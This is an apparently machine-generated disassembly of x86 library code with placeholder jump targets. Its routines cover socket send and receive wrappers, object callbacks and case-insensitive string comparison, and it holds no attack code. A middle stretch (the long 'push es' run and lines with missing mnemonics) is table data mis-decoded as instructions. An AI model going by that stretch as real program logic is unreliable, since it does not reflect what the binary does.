push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push 0x75
push r--data
push 0x15
lea eax [ esi + 0x2c ]
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea ecx [ esi + 0x38 ]
push ecx
push esi
push 0x0
call sub_1001f490
mov eax [ esi ]
add esp 0xc
test eax eax
je r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push 0x1
push esi
call eax
add esp 0x18
test eax eax
jle r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
pop esi
retn
push esi
call eax
push esi
call sub_1001d740
add esp 0x8
sub_10020930
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
push 0xc5
push r--data
push 0x79
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push ebx
push ebp
push 0x2
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esi ]
push ebx
push ebp
push esi
call [ eax + 0xc ]
add esp 0xc
test eax eax
jle r-xdata
push 0xd0
push r--data
push 0x78
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test edi edi
je r-xdata
add [ esi + 0x30 ] eax
push 0x6f
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
push eax
push 0x0
push ebx
push ebp
push 0x82
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100209d0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
jne r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0xe9
push r--data
push 0x79
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push ebx
push ebp
push 0x3
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esi ]
push ebx
push ebp
push esi
call [ eax + 0x8 ]
add esp 0xc
test eax eax
jle r-xdata
push 0xf3
push r--data
push 0x78
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
test edi edi
je r-xdata
add [ esi + 0x34 ] eax
push 0x71
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
push eax
push 0x0
push ebx
push ebp
push 0x83
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10020a80
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
test esi esi
je r-xdata
push 0x108
push r--data
push 0x79
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x14 ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push 0x0
push ebx
push 0x4
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esi ]
push ebx
push esi
call [ eax + 0x10 ]
add esp 0x8
test eax eax
jle r-xdata
push 0x114
push r--data
push 0x78
jmp r-xdata
pop edi
pop esi
pop ebx
retn
test edi edi
je r-xdata
add [ esi + 0x34 ] eax
push 0x6e
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
push eax
push 0x0
push 0x0
push ebx
push 0x84
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_10020b20
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
je r-xdata
push 0x129
push r--data
push 0x79
mov eax [ esi ]
test eax eax
je r-xdata
mov ecx [ eax + 0x14 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
test edi edi
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
jne r-xdata
push 0x1
push 0x0
push ebx
push ebp
push 0x5
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esi ]
push ebx
push ebp
push esi
call [ eax + 0x14 ]
add esp 0xc
test edi edi
je r-xdata
push 0x135
push r--data
push 0x78
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
push 0x0
push ebx
push ebp
push 0x85
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x68
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
sub_10020bc0
mov eax [ esp + 0x10 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
test esi esi
mov [ esp + 0x20 ] eax
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x168
push r--data
push 0x79
push 0x67
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x1c ]
mov ebp [ esp + 0x18 ]
test edi edi
je r-xdata
mov edx [ esi ]
lea eax [ esp + 0x20 ]
push eax
push ebx
push ebp
push esi
call [ edx + 0x18 ]
add esp 0x10
test edi edi
je r-xdata
push 0x1
push ebx
lea ecx [ esp + 0x28 ]
push ebp
push ecx
push 0x6
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
push ebx
lea ecx [ esp + 0x28 ]
push ebp
push ecx
push 0x86
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10020c60
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
test esi esi
push edi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
push 0x168
push r--data
push 0x79
push 0x67
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x20 ]
mov ebp [ esp + 0x1c ]
test edi edi
je r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esi ]
push ebx
push ebp
push edx
push esi
call [ ecx + 0x18 ]
add esp 0x10
test edi edi
je r-xdata
mov eax [ esp + 0x18 ]
push 0x1
push ebp
push eax
push ebx
push 0x6
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
mov eax [ esp + 0x1c ]
push ebp
push eax
push ebx
push 0x86
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10020d00
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
test esi esi
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
retn
push 0x183
push r--data
push 0x79
push 0x83
push 0x20
call sub_1001de60
add esp 0x14
mov eax 0xfffffffe
mov ecx [ eax + 0x24 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
mov ebx [ esp + 0x14 ]
test edi edi
je r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esi ]
push edx
push ebx
push esi
call [ ecx + 0x24 ]
add esp 0xc
test edi edi
je r-xdata
push 0x1
push 0x0
lea eax [ esp + 0x20 ]
push ebx
push eax
push 0x6
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
pop edi
pop esi
pop ebx
retn
push eax
push 0x0
lea eax [ esp + 0x20 ]
push ebx
push eax
push 0x86
push esi
call edi
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_10020d90
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov ecx [ esi + 0x24 ]
mov eax esi
test ecx ecx
je r-xdata
mov eax [ esp + 0xc ]
pop esi
retn
mov ecx [ esp + 0xc ]
test ecx ecx
mov [ eax + 0x24 ] ecx
je r-xdata
mov eax ecx
mov ecx [ eax + 0x24 ]
test ecx ecx
jne r-xdata
mov eax [ esi ]
push edi
test eax eax
je r-xdata
mov [ ecx + 0x28 ] eax
push 0x168
push r--data
push 0x79
push 0x67
push 0x20
call sub_1001de60
add esp 0x14
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax [ esi ]
push 0x0
push 0x0
push 0x6
push esi
call [ eax + 0x18 ]
add esp 0x10
test edi edi
je r-xdata
push 0x1
push 0x0
push 0x6
push 0x0
push 0x6
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax esi
pop edi
pop esi
retn
push eax
push 0x0
push 0x6
push 0x0
push 0x86
push esi
call edi
add esp 0x18
mov eax esi
pop edi
pop esi
retn
sub_10020e30
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
push ebp
mov ebp [ esi + 0x24 ]
push edi
test eax eax
je r-xdata
xor eax eax
pop esi
retn
push 0x168
push r--data
push 0x79
push 0x67
push 0x20
call sub_1001de60
add esp 0x14
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x24 ]
mov [ eax + 0x24 ] ecx
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax ebp
pop edi
mov [ esi + 0x24 ] 0x0
mov [ esi + 0x28 ] 0x0
pop ebp
pop esi
retn
mov edx [ esi + 0x28 ]
mov [ eax + 0x28 ] edx
mov eax [ esi ]
push 0x0
push 0x0
push 0x7
push esi
call [ eax + 0x18 ]
add esp 0x10
test edi edi
je r-xdata
push 0x1
push 0x0
push 0x7
push 0x0
push 0x6
push esi
call edi
add esp 0x18
test eax eax
jle r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
push 0x0
push 0x7
push 0x0
push 0x86
push esi
call edi
add esp 0x18
jmp r-xdata
sub_10020ee0
mov eax [ esp + 0x4 ]
push esi
test eax eax
je r-xdata
xor eax eax
mov esi [ esp + 0xc ]
mov edx esi
and edx 0xff
mov eax [ eax + 0x24 ]
test eax eax
jne r-xdata
mov ecx [ ecx ]
test edx edx
jne r-xdata
mov ecx [ eax ]
test ecx ecx
je r-xdata
cmp ecx esi
je r-xdata
test esi ecx
jne r-xdata
pop esi
retn
jmp r-xdata
sub_10020f20
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ebx [ edi + 0x2c ]
mov esi edi
lea eax [ edi + 0x2c ]
mov edi [ edi + 0x24 ]
test esi esi
je r-xdata
cmp ebx 0x1
jg r-xdata
push 0x75
push r--data
push 0x15
push 0xffffffff
push eax
call sub_1001f5f0
add esp 0x14
test eax eax
jg r-xdata
test edi edi
jne r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + 0x38 ]
push eax
push esi
push 0x0
call sub_1001f490
mov eax [ esi ]
add esp 0xc
test eax eax
je r-xdata
push 0x1
push 0x0
push 0x0
push 0x0
push 0x1
push esi
call eax
add esp 0x18
test eax eax
jle r-xdata
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
push esi
call eax
push esi
call sub_1001d740
add esp 0x8
sub_10021000
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
mov eax 0x1
pop esi
retn
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0xc ] 0x0
mov [ esi + 0x14 ] 0x0
mov eax [ esi + 0x1c ]
push 0x2
push eax
call shutdown
mov ecx [ esi + 0x1c ]
push ecx
call closesocket
sub_10021050
push esi
mov esi [ esp + 0xc ]
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
retn
push eax
call WSASetLastError
mov edi [ esp + 0xc ]
mov eax [ esp + 0x14 ]
push 0x0
push eax
mov ecx [ edi + 0x1c ]
push esi
push ecx
call recv
push 0xf
push edi
mov esi eax
call sub_10020900
add esp 0x8
test esi esi
jg r-xdata
mov eax esi
je r-xdata
call WSAGetLastError
cmp eax 0x4
je r-xdata
cmp esi 0xffffffff
jne r-xdata
push 0x9
push edi
call sub_10020920
add esp 0x8
cmp eax 0xb
je r-xdata
cmp eax 0x2733
jne r-xdata
sub_100210c0
push esi
push edi
push 0x0
call WSASetLastError
mov edi [ esp + 0xc ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push 0x0
mov edx [ edi + 0x1c ]
push eax
push ecx
push edx
call send
push 0xf
push edi
mov esi eax
call sub_10020900
add esp 0x8
test esi esi
jg r-xdata
mov eax esi
pop edi
pop esi
retn
je r-xdata
call WSAGetLastError
cmp eax 0x4
je r-xdata
cmp esi 0xffffffff
jne r-xdata
push 0xa
push edi
call sub_10020920
add esp 0x8
cmp eax 0xb
je r-xdata
cmp eax 0x2733
jne r-xdata
sub_10021120
mov eax [ esp + 0x8 ]
push edi
dec eax
mov edi 0x1
cmp eax 0x84
ja r-xdata
xor edi edi
xor ecx ecx
mov cl [ eax + lookup_table_100211f8 ]
jmp [ ecx * 4 + jump_table_100211dc ]
push esi
mov esi [ esp + 0xc ]
test esi esi
je r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
mov edi [ eax + 0x10 ]
mov eax edi
pop edi
retn
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax edi
pop edi
mov [ edx + 0x10 ] ecx
retn
mov eax edi
pop edi
retn
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
mov edx [ ecx ]
mov [ esi + 0x10 ] eax
mov [ esi + 0x1c ] edx
mov [ esi + 0xc ] edi
pop esi
mov eax edi
pop edi
retn
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
or edi 0xffffffff
mov eax edi
pop edi
retn
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov edi [ eax + 0x1c ]
mov eax edi
pop edi
retn
mov edx [ eax + 0x1c ]
mov [ ecx ] edx
mov [ esi + 0xc ] 0x0
mov [ esi + 0x14 ] 0x0
mov edx [ esi + 0x1c ]
push 0x2
push edx
call shutdown
mov eax [ esi + 0x1c ]
push eax
call closesocket
sub_100211ff
add [ edx ] eax
add [ ebx ] al
add eax [ eax ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al 0x5
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add [ esi ] al
push es
push es
push es
add [ eax - 0x74a96f70 ] dl
je r-xdata
popfd
add al 0x0
push 0xf
push edi
mov esi eax
call sub_10020900
add esp 0x8
test esi esi
jg r-xdata
or al 0x57
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push eax
mov edi ecx
call WSASetLastError
push 0x0
push edi
mov edi [ esp + 0x14 ]
push esi
mov eax [ edi + 0x1c ]
push eax
call send
mov eax esi
pop edi
pop esi
retn
je r-xdata
call WSAGetLastError
cmp eax 0x4
je r-xdata
cmp esi 0xffffffff
jne r-xdata
push 0xa
push edi
call sub_10020920
add esp 0x8
cmp eax 0xb
je r-xdata
cmp eax 0x2733
jne r-xdata
sub_10021350
push esi
mov esi [ esp + 0x8 ]
push edi
push 0x0
push 0xffffffff
push esi
call sub_10023a40
mov edi [ esp + 0x1c ]
push 0x0
push 0xffffffff
push edi
call sub_10023a40
add esp 0x18
add edi 0x44
add esi 0x44
mov ecx 0x14
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
retn
sbb eax eax
sbb eax 0xffffffff
sub_10021390
mov eax 0x14
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x20 ]
push esi
push edi
mov eax [ ebp ]
push eax
call sub_1001e7b0
mov ebx [ esp + 0x30 ]
mov esi eax
mov ecx [ ebx ]
push ecx
call sub_1001e7b0
add esp 0x8
sub esi eax
je r-xdata
mov edx [ ebp ]
push edx
call sub_1001e7b0
mov esi eax
add esp 0x4
dec esi
mov [ esp + 0x1c ] esi
js r-xdata
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov eax [ ebp ]
push eax
call sub_1001e7b0
mov esi eax
add esp 0x4
dec esi
js r-xdata
mov eax [ ebp ]
push esi
push eax
call sub_1001e7c0
mov ecx [ ebx ]
mov ebp eax
push esi
push ecx
mov [ esp + 0x28 ] ebp
call sub_1001e7c0
mov ecx [ ebp + 0x4 ]
mov edi eax
add esp 0x10
mov [ esp + 0x20 ] edi
mov eax [ edi + 0x4 ]
mov edx [ ecx + 0x4 ]
mov ebx edx
sub ebx [ eax + 0x4 ]
je r-xdata
xor eax eax
mov ecx [ ebp ]
push esi
push ecx
call sub_1001e7c0
mov edx [ ebx ]
push esi
push edx
mov edi eax
call sub_1001e7c0
mov eax [ eax ]
mov ecx [ edi ]
push eax
push ecx
call sub_10030b10
add esp 0x18
test eax eax
jne r-xdata
cmp edx 0x13
jne r-xdata
push edx
call sub_10030ea0
mov edx [ edi + 0x4 ]
mov esi eax
mov eax [ edx + 0x4 ]
push eax
call sub_10030ea0
add esp 0x8
test esi 0x2006
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
dec esi
jns r-xdata
cmp edx 0x16
jne r-xdata
mov esi [ ecx ]
mov ebx [ ecx + 0x8 ]
mov edi [ eax ]
mov ebp [ eax + 0x8 ]
test esi esi
mov [ esp + 0x10 ] ebx
jle r-xdata
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
add esp 0x14
retn
test eax 0x2006
je r-xdata
mov edx [ ebp + 0x4 ]
mov eax [ edi + 0x4 ]
mov ecx [ edx ]
mov esi [ eax ]
mov ebx ecx
sub ebx esi
jne r-xdata
mov ecx [ ebp ]
push ecx
call sub_10022ae0
add esp 0x4
cmp eax 0x30
jne r-xdata
test edi edi
jle r-xdata
xor ecx ecx
mov cl [ ebx ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov esi [ ebp + 0x4 ]
mov edx [ edi + 0x4 ]
mov ecx [ esi ]
mov edi [ edx ]
mov eax ecx
sub eax edi
jne r-xdata
test ebx ebx
jne r-xdata
mov edi [ eax + 0x8 ]
mov esi [ edx + 0x8 ]
xor ebx ebx
[ esi ] [ edi ]
je r-xdata
mov edx [ esp + 0x18 ]
mov ebp [ edi + 0x4 ]
mov edi [ edx + 0x4 ]
mov eax [ ebp ]
mov ebx [ edi ]
cmp ebx eax
je r-xdata
test esi esi
jle r-xdata
xor edx edx
mov dl [ ebp ]
push edx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov [ esp + 0x10 ] ebx
dec esi
inc ebx
test esi esi
jg r-xdata
test eax eax
je r-xdata
mov edi [ edx + 0x8 ]
mov esi [ esi + 0x8 ]
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x20 ]
mov eax [ ecx + 0x8 ]
mov ecx [ edx + 0x8 ]
sub eax ecx
jne r-xdata
sbb ebx ebx
sbb ebx 0xffffffff
xor esi esi
test ebx ebx
jle r-xdata
sub ebx eax
jmp r-xdata
test edi edi
jle r-xdata
lea eax [ esi + ebx - 0x1 ]
mov [ esp + 0x14 ] eax
dec edi
inc ebp
test edi edi
jg r-xdata
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
mov esi [ esp + 0x1c ]
mov ebp [ esp + 0x28 ]
mov ebx [ esp + 0x2c ]
dec esi
mov [ esp + 0x1c ] esi
jns r-xdata
mov eax [ edi + 0x8 ]
xor ecx ecx
mov cl [ eax + esi ]
push ecx
call tolower
mov edx [ ebp + 0x8 ]
mov ebx eax
xor eax eax
mov al [ edx + esi ]
push eax
call tolower
add esp 0x8
cmp ebx eax
jne r-xdata
test esi esi
jle r-xdata
lea ebx [ edi + ebp - 0x1 ]
mov ecx [ esp + 0x14 ]
dec esi
dec ecx
test esi esi
mov [ esp + 0x14 ] ecx
jg r-xdata
mov eax [ edi ]
inc esi
cmp esi eax
jl r-xdata
test edi edi
jle r-xdata
jmp r-xdata
mov ebx [ esp + 0x10 ]
dec edi
dec ebx
test edi edi
jg r-xdata
mov edx [ esp + 0x14 ]
xor ecx ecx
mov cl [ edx ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
jmp r-xdata
sub esi edi
mov ebx esi
jmp r-xdata
test edi edi
jle r-xdata
xor eax eax
mov al [ ebx ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
test esi esi
jg r-xdata
xor ecx ecx
mov cl [ ebx ]
push ecx
call tolower
xor edx edx
mov ebx eax
mov dl [ ebp ]
push edx
call tolower
add esp 0x8
cmp ebx eax
jne r-xdata
mov ebx [ esp + 0x10 ]
inc ebx
inc ebp
dec esi
dec edi
test esi esi
mov [ esp + 0x10 ] ebx
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
mov al [ ebx ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
test esi esi
jg r-xdata
xor ecx ecx
mov cl [ ebp ]
push ecx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov ebx [ esp + 0x10 ]
jmp r-xdata
xor edx edx
mov dl [ ebx ]
push edx
call isspace
add esp 0x4
test eax eax
je r-xdata
mov [ esp + 0x10 ] ebx
dec esi
inc ebx
test esi esi
jg r-xdata
dec edi
inc ebp
test edi edi
jg r-xdata
xor eax eax
mov al [ ebp ]
push eax
call isspace
add esp 0x4
test eax eax
je r-xdata
sub_100216e0
mov eax 0x20
call sub_1001d0d0
push esi
mov esi [ esp + 0x28 ]
push 0x0
push esi
call sub_100201e0
lea eax [ esp + 0xc ]
push eax
call sub_1002aa30
lea ecx [ esp + 0x10 ]
push 0x8
push ecx
call sub_1002b610
add esp 0x14
push 0x0
call sub_10025900
lea edx [ esp + 0x8 ]
push eax
push edx
call sub_1002aa50
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
push ecx
lea eax [ esp + 0x14 ]
push edx
push eax
call sub_1002ab80
lea ecx [ esp + 0x2c ]
push 0x0
lea edx [ esp + 0x20 ]
push ecx
push edx
call sub_1002aba0
lea eax [ esp + 0x28 ]
push eax
call sub_1002b000
mov eax [ esp + 0x3f ]
mov ecx [ esp + 0x3e ]
mov edx [ esp + 0x3d ]
and eax 0xff
shl eax 0x8
and ecx 0xff
and edx 0xff
or eax ecx
mov ecx [ esp + 0x3c ]
shl eax 0x8
or eax edx
add esp 0x28
shl eax 0x8
and ecx 0xff
pop esi
or eax ecx
add esp 0x20
retn
sub_10021790
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
test eax eax
je r-xdata
mov eax [ eax + 0x18 ]
push eax
call sub_10034510
add esp 0x4
retn
sub_100217b0
mov eax [ esp + 0x4 ]
push ebx
xor ebx ebx
push esi
test eax eax
push edi
je r-xdata
xor esi esi
mov eax [ eax ]
test eax eax
je r-xdata
push esi
call sub_10023940
add esp 0x4
mov eax ebx
pop edi
pop esi
pop ebx
retn
jmp [ eax * 4 + jump_table_10021878 ]
mov eax [ eax + 0x18 ]
push eax
call sub_10034510
add esp 0x4
mov esi eax
jmp r-xdata
push esi
mov ebx 0x1
call sub_10023940
add esp 0x4
mov eax ebx
pop edi
pop esi
pop ebx
retn
push 0x196
push r--data
push 0x74
jmp r-xdata
push 0x199
push r--data
push 0x73
jmp r-xdata
mov eax [ edi ]
cmp eax 0x198
jne r-xdata
mov edi [ esp + 0x14 ]
push edi
push esi
call sub_10023770
add eax 0x2
add esp 0x8
cmp eax 0x3
ja r-xdata
push 0x80
push 0xb
call sub_1001de60
add esp 0x14
cmp eax 0x1c
jne r-xdata
push 0x19f
push r--data
push 0x10
jmp r-xdata
push 0x1ab
push r--data
push 0x75
push 0x1a7
push r--data
push 0x72
jmp r-xdata
sub_10021890
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
push esi
call sub_10034ff0
mov esi eax
test esi esi
je r-xdata
retn
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
push ecx
mov ecx [ esp + 0xc ]
push edx
mov edx [ esp + 0xc ]
push ecx
push edx
call eax
add esp 0x10
call sub_100347a0
mov [ rw-data ] eax
push esi
call sub_10035010
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
push esi
call sub_10022640
add esp 0x4
test eax eax
pop esi
je r-xdata
sub_10021900
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_10034ff0
mov esi eax
test esi esi
je r-xdata
or eax 0xffffffff
retn
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
retn
call sub_100347a0
mov [ rw-data ] eax
push esi
call sub_10035010
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
push esi
call sub_10022640
add esp 0x4
test eax eax
pop esi
je r-xdata
sub_10021970
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_10034ff0
mov esi eax
test esi esi
je r-xdata
or eax 0xffffffff
retn
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
push ecx
push edx
call eax
add esp 0x8
retn
call sub_100347a0
mov [ rw-data ] eax
push esi
call sub_10035010
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
push esi
call sub_10022640
add esp 0x4
test eax eax
pop esi
je r-xdata
sub_100219e0
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
push esi
call sub_10034ff0
mov esi eax
test esi esi
je r-xdata
xor eax eax
retn
jmp eax
call sub_100347a0
mov [ rw-data ] eax
push esi
call sub_10035010
add esp 0x4
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
push esi
call sub_10022640
add esp 0x4
test eax eax
pop esi
je r-xdata
sub_10021a40
push esi
mov esi [ esp + 0x8 ]
push esi
push 0x2
mov eax [ esi ]
push eax
call sub_100229a0
add esp 0x4
push eax
call sub_100257b0
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ esi ]
push esi
push 0x2
push ecx
call sub_10022a40
add esp 0x4
push eax
call sub_100257b0
add esp 0xc
pop esi
retn
pop esi
retn
sub_10021a80
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi ]
push eax
call sub_100229a0
mov edi eax
push esi
push 0x1
push edi
call sub_100257b0
add esp 0x10
test eax eax
jne r-xdata
mov ecx [ esi ]
push esi
push 0x1
push ecx
call sub_10022a40
add esp 0x4
push eax
call sub_100257b0
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
cmp edx ecx
je r-xdata
pop edi
pop esi
retn
pop edi
pop esi
retn
push edi
push 0x8001
push ecx
call sub_100229a0
add esp 0x4
push eax
call sub_100257b0
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esi + 0x4 ]
push edi
push 0x8001
push edx
call sub_10022a40
add esp 0x4
push eax
call sub_100257b0
add esp 0xc
pop edi
pop esi
retn
sub_10021b30
push esi
push edi
push 0xb6
push r--data
push 0x40
call sub_1001d4c0
mov esi eax
xor edi edi
add esp 0xc
cmp esi edi
jne r-xdata
push sub_10021bc0
call sub_1001e440
add esp 0x4
mov [ esi + 0x4 ] eax
mov [ esi ] 0x1
call sub_1001e3c0
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
call sub_1001f900
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
pop edi
xor eax eax
pop esi
retn
lea eax [ esi + 0x34 ]
mov [ esi + 0x18 ] edi
push eax
push esi
push 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
call sub_1001f420
add esp 0xc
mov [ esi + 0x3c ] 0x1
mov eax esi
pop edi
pop esi
retn
pop edi
xor eax eax
pop esi
retn
sub_10021bc0
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
push esi
push edi
mov ecx [ eax ]
mov edx [ edx ]
mov esi [ ecx ]
mov edi [ edx ]
mov eax esi
sub eax edi
jne r-xdata
pop edi
pop esi
